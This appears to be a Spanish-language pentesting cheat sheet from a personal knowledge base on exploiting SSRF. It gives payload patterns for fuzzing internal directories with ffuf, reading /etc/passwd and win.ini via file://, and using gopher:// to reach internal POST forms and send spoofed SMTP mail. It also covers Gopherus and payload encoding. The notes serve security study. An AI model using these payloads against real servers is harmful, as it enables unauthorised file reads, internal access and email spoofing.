---
aliases: null
tags:
  - type/technique
  - vuln/ssrf
  - technique/lateral-movement
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[Server-Side Request Forgery (SSRF)]]'
  - '[[SSRF - CWES]]'
  - '[[SSRF - Gopher]]'
  - '[[Anatomía de la Construcción de un Payload Gopher]]'
---
# SSRF - Explotación

***

## Cheatsheet

| **Técnica / Objetivo**                      | **Protocolo**           | **Payload / Comando**                                                                                     | **Detalles y Notas**                                                                                                                                                             |
| ------------------------------------------- | ----------------------- | --------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| <br>**Enumeración de Directorios Internos** | <br><br>`http://`       | <pre><code>ffuf -w wordlist.txt -u URL -d "param=http://interno/FUZZ.php" -fr "Error String"</code></pre> | <br>Utilizar [[ffuf]] para fuerza bruta sobre directorios internos. Es vital usar `-fr` (Filter Regex) para ocultar las respuestas de error estándar del servidor (404/403).     |
| <br>**Local File Inclusion (LFI)**          | <br><br>`file://`       | <pre><code>file:///etc/passwd</code></pre><pre><code>file:///C:/Windows/win.ini</code></pre>              | <br>Si no hay validación de esquema, permite leer archivos del sistema de archivos local del servidor.                                                                           |
| <br><br>**Bypass de Método (GET a POST)**   | <br><br><br>`gopher://` | <br><br><pre><code>gopher://<IP>:<PORT>/_POST%20/admin.php...</code></pre><br><br>                        | <br>El protocolo [[Gopher]] permite enviar bytes arbitrarios a un socket TCP. Útil para interactuar con formularios internos que requieren POST cuando el SSRF solo permite GET. |
| <br>**Interacción con SMTP**                | <br><br>`gopher://`     | <br><pre><code>gopher://127.0.0.1:25/_MAIL%20FROM...</code></pre>                                         | <br>Permite enviar correos electrónicos falsificados desde el `localhost` (puerto 25), a menudo confiable para el servidor de correo interno.<br><br>                            |
| <br>**Generación de Payloads (Gopherus)**   | <br><br>`Script`        | <br><pre><code>python2.7 gopherus.py --exploit [smtp\|mysql\|redis]</code></pre>                          | <br>Herramienta para automatizar la creación de URLs Gopher complejas. Soporta: [[MySQL]], [[PostgreSQL]], FastCGI, Redis, SMTP, Zabbix.<br><br>                                 |
^ssrf-explotacion

### Consideraciones de Codificación 
([[Anatomía de la Construcción de un Payload Gopher]])

Al trabajar con el protocolo **Gopher**, la codificación es crítica para el éxito del exploit:

|**Paso**|**Acción**|**Razón**|
|---|---|---|
|**1. Estructura Raw**|Crear la petición HTTP/SQL/SMTP tal cual se enviaría por socket.|Gopher envía datos crudos.|
|**2. URL Encode**|Codificar caracteres especiales, especialmente saltos de línea (`%0D%0A`) y espacios (`%20`).|El formato de URL no soporta espacios ni saltos de línea directos.|
|**3. Doble URL Encode**|Volver a codificar el payload completo si se pasa como parámetro GET/POST.|El servidor web decodificará el parámetro una vez; el backend que realiza la petición SSRF necesita recibir los caracteres codificados para procesarlos correctamente.|



***

## Overview


***
